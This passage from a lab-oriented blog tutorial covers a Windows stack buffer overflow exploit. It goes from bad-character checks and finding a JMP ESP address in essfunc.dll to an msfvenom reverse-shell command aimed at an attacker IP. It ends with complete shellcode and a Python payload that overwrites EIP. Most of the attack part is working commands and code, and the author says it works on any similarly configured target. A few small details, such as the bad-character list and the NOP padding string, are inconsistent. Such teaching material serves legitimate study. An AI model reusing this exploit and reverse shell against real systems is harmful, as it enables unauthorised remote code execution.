+<span class="n">A1</span> <span class="n">A2</span> <span class="n">A3</span> <span class="n">A4</span> <span class="n">A5</span> <span class="n">A6</span> <span class="n">A7</span> <span class="n">A8</span> <span class="mi">0</span><span class="n">A</span> <span class="mi">0</span><span class="n">D</span> <span class="n">AB</span> <span class="n">AC</span> <span class="n">AD</span> <span class="n">AE</span> <span class="n">AF</span> <span class="n">B0</span> <span class="n">B1</span> <span class="n">B2</span> <span class="n">B3</span> <span class="n">B4</span> <span class="n">B5</span> <span class="n">B6</span> <span class="n">B7</span> <span class="n">B8</span> <span class="n">B9</span> <span class="n">BA</span> <span class="n">BB</span> <span class="n">BC</span> <span class="n">BD</span> <span class="n">BE</span> <span class="n">BF</span> <span class="n">C0</span>
+<span class="n">C1</span> <span class="n">C2</span> <span class="n">C3</span> <span class="n">C4</span> <span class="n">C5</span> <span class="n">C6</span> <span class="n">C7</span> <span class="n">C8</span> <span class="n">C9</span> <span class="n">CA</span> <span class="n">CB</span> <span class="n">CC</span> <span class="mi">0</span><span class="n">A</span> <span class="mi">0</span><span class="n">D</span> <span class="n">CF</span> <span class="n">D0</span> <span class="n">D1</span> <span class="n">D2</span> <span class="n">D3</span> <span class="mi">0</span><span class="n">A</span> <span class="mi">0</span><span class="n">D</span> <span class="n">D6</span> <span class="n">D7</span> <span class="n">D8</span> <span class="n">D9</span> <span class="n">DA</span> <span class="n">DB</span> <span class="n">DC</span> <span class="n">DD</span> <span class="n">DE</span> <span class="n">DF</span> <span class="n">E0</span>
+<span class="n">E1</span> <span class="n">E2</span> <span class="n">E3</span> <span class="n">E4</span> <span class="n">E5</span> <span class="n">E6</span> <span class="n">E7</span> <span class="n">E8</span> <span class="n">E9</span> <span class="n">EA</span> <span class="n">EB</span> <span class="n">EC</span> <span class="n">ED</span> <span class="n">EE</span> <span class="n">EF</span> <span class="n">F0</span> <span class="n">F1</span> <span class="n">F2</span> <span class="n">F3</span> <span class="n">F4</span> <span class="n">F5</span> <span class="n">F6</span> <span class="n">F7</span> <span class="n">F8</span> <span class="n">F9</span> <span class="n">FA</span> <span class="n">FB</span> <span class="n">FC</span> <span class="n">FD</span> <span class="n">FE</span> <span class="n">FF</span>
+</code></pre></div>
+
+<p>Or, luckily we can have mona take care of this problem for us.</p>
+<p><code>!mona compare -f C:\mona\oscp\bytearray.bin -a &lt;address&gt;</code></p>
+<p>No matter how we do that we get <code>a9 aa cd ce d4 d5</code>. One thing that can happen here, is that often when a character is changed, the character next to it gets changed to the wrong value too. But sometimes that second value isn't an actual bad char. To verify this we can remove A9, CD and D4 from our byte array and test again.</p>
+<p>Of course for this we'll have to generate a byte array without those.</p>
+<p><code>!mona bytearray -b "\x00\xa9\xCD\xD4"</code></p>
+<p>And then we compare again. If there are no more bad characters we can confirm that we have all the values we need to avoid.</p>
+<h3>Finding the Right Module</h3>
+<p>Alright, so we want to find what libraries are loaded by the application. And then find a JMP ESP instruction in those. So that we can tell the program what to execute our payload next.</p>
+<p>One way we could do this is via Immunity Debugger's → View → Executable Modules and then view memory in each loaded module and search for an <code>FF E4</code> instruction in it. <code>FF E4</code> is the Hex for a JMP ESP instruction, we can check via nasm_shell.rb in the metasploit framework tools.</p>
+<p>Now one thing this method is missing is what protections are active in the library. So i don't recommend it. I do recommend that you use <code>mona</code> this time.</p>
+<p><code>!mona modules</code></p>
+<p>This will tell us what executable modules are loaded by our binary and it will also tell us which protections are in place for each. We can see that <code>essfunc.dll</code> has no protections active. Great we can exploit that. Then we can either follow the above procedure or we can just use this command to do the same thing:</p>
+<p><code>!mona find -s "\xff\xe4" -m essfunc.dll</code></p>
+<p>We'd then choose an address that does not have any bad characters in it.</p>
+<p>Or, rather, my favourite, we can do all of this at once:</p>
+<p><code>!mona jmp -r esp -cpb "\x00\xa0\xcd\xd4"</code></p>
+<p>Sorry I left that one for last, but now you know why we're using it. What it does is search for search for <code>jmp</code> instructions to the register specified by <code>-r</code> and avoiding the bad characters in <code>-cpb</code>.</p>
+<p>This gives us address: <code>625011AF</code></p>
+<p>Now we know the machine is x86 architecture which is little-endian (this is out of scope for this talk), but it means that we need to reverse the byte order to get the actual address in memory which becomes <code>AF115062</code>.</p>
+<p>Or for the purposes of overwriting the return address (and therefore the EIP): <code>\xaf\x11\x50\x62</code>.</p>
+<h3>Generating Shellcode and the NOP sled</h3>
+<p>All we need now is actually something to execute. Let's get a reverse shell.</p>
+<p>We'll use <code>msfvenom</code> to generate our shell code. You should already be familiar with this tool, if you aren't take a look at the What the Shell room on TryHackMe (<a href="https://tryhackme.com/room/introtoshells">https://tryhackme.com/room/introtoshell</a>).</p>
+<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.8.98.189 LPORT=4444 EXITFUNC=thread -b "\x00\xa0\xcd\xd4" -a x86 -f c</code></p>
+<p>This generates code for a windows reverse shell, pointed at our attack machine, on port 4444, for x86 architecture and we ask for it in c because it gives us something that'll be really easy to convert to our python exploit.</p>
+<p>We copy this part to our exploit:</p>
+<div class="highlight"><pre><span></span><code><span class="s">&quot;</span><span class="se">\xb8\xbd\xf9\x81\x1a\xdb\xd9\xd9\x74\x24\xf4\x5e\x29\xc9\xb1</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x52\x83\xee\xfc\x31\x46\x0e\x03\xfb\xf7\x63\xef\xff\xe0\xe6</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x10\xff\xf0\x86\x99\x1a\xc1\x86\xfe\x6f\x72\x37\x74\x3d\x7f</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\xbc\xd8\xd5\xf4\xb0\xf4\xda\xbd\x7f\x23\xd5\x3e\xd3\x17\x74</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\xbd\x2e\x44\x56\xfc\xe0\x99\x97\x39\x1c\x53\xc5\x92\x6a\xc6</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\xf9\x97\x27\xdb\x72\xeb\xa6\x5b\x67\xbc\xc9\x4a\x36\xb6\x93</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x4c\xb9\x1b\xa8\xc4\xa1\x78\x95\x9f\x5a\x4a\x61\x1e\x8a\x82</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x8a\x8d\xf3\x2a\x79\xcf\x34\x8c\x62\xba\x4c\xee\x1f\xbd\x8b</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x8c\xfb\x48\x0f\x36\x8f\xeb\xeb\xc6\x5c\x6d\x78\xc4\x29\xf9</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x26\xc9\xac\x2e\x5d\xf5\x25\xd1\xb1\x7f\x7d\xf6\x15\xdb\x25</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x97\x0c\x81\x88\xa8\x4e\x6a\x74\x0d\x05\x87\x61\x3c\x44\xc0</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x46\x0d\x76\x10\xc1\x06\x05\x22\x4e\xbd\x81\x0e\x07\x1b\x56</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x70\x32\xdb\xc8\x8f\xbd\x1c\xc1\x4b\xe9\x4c\x79\x7d\x92\x06</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x79\x82\x47\x88\x29\x2c\x38\x69\x99\x8c\xe8\x01\xf3\x02\xd6</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x32\xfc\xc8\x7f\xd8\x07\x9b\x75\x15\x65\xe6\xe2\x27\x69\x09</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\xaf\xae\x8f\x43\x5f\xe7\x18\xfc\xc6\xa2\xd2\x9d\x07\x79\x9f</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x9e\x8c\x8e\x60\x50\x65\xfa\x72\x05\x85\xb1\x28\x80\x9a\x6f</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x44\x4e\x08\xf4\x94\x19\x31\xa3\xc3\x4e\x87\xba\x81\x62\xbe</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x14\xb7\x7e\x26\x5e\x73\xa5\x9b\x61\x7a\x28\xa7\x45\x6c\xf4</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x28\xc2\xd8\xa8\x7e\x9c\xb6\x0e\x29\x6e\x60\xd9\x86\x38\xe4</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x9c\xe4\xfa\x72\xa1\x20\x8d\x9a\x10\x9d\xc8\xa5\x9d\x49\xdd</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\xde\xc3\xe9\x22\x35\x40\x09\xc1\x9f\xbd\xa2\x5c\x4a\x7c\xaf</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x5e\xa1\x43\xd6\xdc\x43\x3c\x2d\xfc\x26\x39\x69\xba\xdb\x33</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\xe2\x2f\xdb\xe0\x03\x7a</span><span class="s">&quot;</span>
+</code></pre></div>
+
+<p>We will append this at the end of our payload. Now we're still missing one final piece of the puzzle. If our payload misses the ESP pointer by one byte it wont execute.</p>
+<p>It's generally good practice to add 8 or 16 bytes of <code>\x90</code>, or No Operation (NOP) bytes as padding before our payload. This is what's called a NOP Sled. If ESP points anywhere at our NOP sled it'll still execute our payload.</p>
+<blockquote>
+<p>NOP sleds are usually more important when dealing with ASLR protections, as the size of a NOP sled increases the probability that we'll be able to execute our payload.<br> Once again for more information on this <a href="https://github.com/r0hi7/BinExp">https://github.com/r0hi7/BinExp</a> is a great source.</p>
+</blockquote>
+<p>So finally our payload should look something like:</p>
+<div class="highlight"><pre><span></span><code><span class="n">offset</span> <span class="o">=</span> <span class="mi">2026</span>
+<span class="n">overflow</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span>
+<span class="n">EIP</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\xaf\x11\x50\x62</span><span class="s1">&#39;</span>
+<span class="n">padding</span> <span class="o">=</span> <span class="s1">&#39;x90&#39;</span> <span class="o">*</span> <span class="mi">16</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span>
+<span class="s2">&quot;</span><span class="se">\xb8\xbd\xf9\x81\x1a\xdb\xd9\xd9\x74\x24\xf4\x5e\x29\xc9\xb1</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\x52\x83\xee\xfc\x31\x46\x0e\x03\xfb\xf7\x63\xef\xff\xe0\xe6</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\x10\xff\xf0\x86\x99\x1a\xc1\x86\xfe\x6f\x72\x37\x74\x3d\x7f</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\xbc\xd8\xd5\xf4\xb0\xf4\xda\xbd\x7f\x23\xd5\x3e\xd3\x17\x74</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\xbd\x2e\x44\x56\xfc\xe0\x99\x97\x39\x1c\x53\xc5\x92\x6a\xc6</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\xf9\x97\x27\xdb\x72\xeb\xa6\x5b\x67\xbc\xc9\x4a\x36\xb6\x93</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\x4c\xb9\x1b\xa8\xc4\xa1\x78\x95\x9f\x5a\x4a\x61\x1e\x8a\x82</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\x8a\x8d\xf3\x2a\x79\xcf\x34\x8c\x62\xba\x4c\xee\x1f\xbd\x8b</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\x8c\xfb\x48\x0f\x36\x8f\xeb\xeb\xc6\x5c\x6d\x78\xc4\x29\xf9</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\x26\xc9\xac\x2e\x5d\xf5\x25\xd1\xb1\x7f\x7d\xf6\x15\xdb\x25</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\x97\x0c\x81\x88\xa8\x4e\x6a\x74\x0d\x05\x87\x61\x3c\x44\xc0</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\x46\x0d\x76\x10\xc1\x06\x05\x22\x4e\xbd\x81\x0e\x07\x1b\x56</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\x70\x32\xdb\xc8\x8f\xbd\x1c\xc1\x4b\xe9\x4c\x79\x7d\x92\x06</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\x79\x82\x47\x88\x29\x2c\x38\x69\x99\x8c\xe8\x01\xf3\x02\xd6</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\x32\xfc\xc8\x7f\xd8\x07\x9b\x75\x15\x65\xe6\xe2\x27\x69\x09</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\xaf\xae\x8f\x43\x5f\xe7\x18\xfc\xc6\xa2\xd2\x9d\x07\x79\x9f</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\x9e\x8c\x8e\x60\x50\x65\xfa\x72\x05\x85\xb1\x28\x80\x9a\x6f</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\x44\x4e\x08\xf4\x94\x19\x31\xa3\xc3\x4e\x87\xba\x81\x62\xbe</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\x14\xb7\x7e\x26\x5e\x73\xa5\x9b\x61\x7a\x28\xa7\x45\x6c\xf4</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\x28\xc2\xd8\xa8\x7e\x9c\xb6\x0e\x29\x6e\x60\xd9\x86\x38\xe4</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\x9c\xe4\xfa\x72\xa1\x20\x8d\x9a\x10\x9d\xc8\xa5\x9d\x49\xdd</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\xde\xc3\xe9\x22\x35\x40\x09\xc1\x9f\xbd\xa2\x5c\x4a\x7c\xaf</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\x5e\xa1\x43\xd6\xdc\x43\x3c\x2d\xfc\x26\x39\x69\xba\xdb\x33</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="se">\xe2\x2f\xdb\xe0\x03\x7a</span><span class="s2">&quot;</span>
+<span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">overflow</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">shellcode</span>
+</code></pre></div>
+
+<h3>Getting a Shell</h3>
+<p>All we have to do now is set up a listener on port 4444, and execute our exploit.</p>
+<p>This should work on any target with a similar configuration because essfunc.dll has no protections.</p>
+<h2>Final Words</h2>
+<p>This may have seemed extremely long, but as you saw throughout this, we built a nice little exploit out of it. And this exploit becomes really adaptable, we reuse it for future similar overflows. </p>
+<p>Play around with it and soon it will only take you a few minutes to get a working exploit on a given buffer overflow. In fact you could turn all of this into a script and automate most of it.</p>
+<p>With this knowledge you can do all the overflow rooms in THM's Offensive Pentesting path. Have fun with those.</p>
+<p>But this is just scratching the surface of Buffer Overflows, there's more we can do, as I alluded earlier. If you want to take a look at x64 architecture buffer overflows and how you can use them to control variables, call other functions etc. in linux please go do the <a href="https://tryhackme.com/room/bof1">Buffer Overflows room</a>. The <a href="https://tryhackme.com/room/thecodcaper">Cod Caper room</a> also give you an overview of how this knowledge can be used in a privilege escalation scenario as well as how to use the pwntools python library.</p>
+<p>If you're looking to know more about binary exploitation I do recommend the github I've been sharing so far: <a href="https://github.com/r0hi7/BinExp">https://github.com/r0hi7/BinExp</a>, it is Linux x64 focused but the concepts are not too dissimilar.</p>
+<p>Information there is pretty detailed and easy to understand, and has plenty of practical examples.</p>
+<p>Additionally if you want to learn more about assembly and reverse engineering check out the <a href="https://tryhackme.com/room/introtox8664">Intro to 86-64 room</a> on tryHackMe. There is plenty to learn from.</p>
+<p>Be bold, play around, hack the planet.</p>
+  </div>
+  <div class="tag-cloud">
+    <p>
+      <a href="https://omega-void.github.io/tag/tutorial.html">tutorial</a>
+      <a href="https://omega-void.github.io/tag/binexp.html">binexp</a>
+      <a href="https://omega-void.github.io/tag/buffer-overflows.html">buffer overflows</a>
+    </p>
+  </div>
+
+
+
+
+
+</article>
+
+    <footer>
+<p>&copy;  </p>
+<p>
+Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using a modified <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+</p>
+<div class="badge">
+  <script src="https://tryhackme.com/badge/127811"></script>
+</div>    </footer>
+  </main>
+
+
+
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " OmegaVoid - Blog of Many Things ",
+  "url" : "https://omega-void.github.io",
+  "image": "https://omega-void.github.io/images/OV.png",
+  "description": ""
+}
+</script>
+
+
+</body>
+</html>
